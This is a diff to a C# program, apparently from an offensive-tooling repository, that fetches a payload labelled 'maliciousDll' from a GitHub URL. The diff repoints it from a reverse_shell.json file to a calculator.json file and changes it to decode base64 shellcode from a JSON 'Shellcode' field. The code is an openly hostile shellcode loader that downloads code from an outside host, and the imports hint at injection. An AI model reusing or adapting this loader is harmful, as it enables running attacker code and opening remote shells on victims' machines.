@@ -1,4 +1,5 @@
 using System;
+using System.Text.Json.Nodes;
 using System.Net.Http;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -6,14 +7,18 @@ using System.Runtime.InteropServices;
 public class Program {
 
 
-    public static byte[] maliciousDll = GetMaliciousDll("https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/reverse_shell.json");
+    public static byte[] maliciousDll = GetMaliciousDll("https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/calculator.json");
 
     public static byte[] GetMaliciousDll(string url) {
         HttpClient client = new HttpClient();
         HttpResponseMessage response = client.GetAsync(url).Result;
         response.EnsureSuccessStatusCode();
         {
-            byte[] maliciousDll = response.Content.ReadAsByteArrayAsync().Result;
+            
+            string jsonString = response.Content.ReadAsStringAsync().Result;
+            var jsonObject = JsonNode.Parse(jsonString);
+            string maliciousDllString = (string) jsonObject["Shellcode"];
+            byte[] maliciousDll = Convert.FromBase64String(maliciousDllString);
             Console.WriteLine("Size of DLL is: " + maliciousDll.Length + " bytes");
         }
         return maliciousDll;
